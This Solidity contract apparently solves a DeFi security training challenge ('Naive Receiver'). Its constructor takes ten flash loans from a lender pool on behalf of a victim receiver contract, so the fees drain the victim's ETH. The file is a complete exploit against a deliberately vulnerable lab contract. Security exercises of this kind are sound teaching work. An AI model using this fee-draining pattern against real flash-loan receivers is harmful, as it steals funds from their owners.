// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./NaiveReceiverLenderPool.sol";
import "./FlashLoanReceiver.sol";

contract FlashLoanRepeater {

    address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
    NaiveReceiverLenderPool public immutable pool;
    FlashLoanReceiver public immutable receiver;

    constructor(address payable _pool, address payable _receiver) {
        pool = NaiveReceiverLenderPool(_pool);
        receiver = FlashLoanReceiver(_receiver);

        for(uint i = 0; i < 10;  i++) {
            pool.flashLoan(
                receiver,
                ETH,
                pool.maxFlashLoan(ETH),
                ""
            );
        }
    }
}
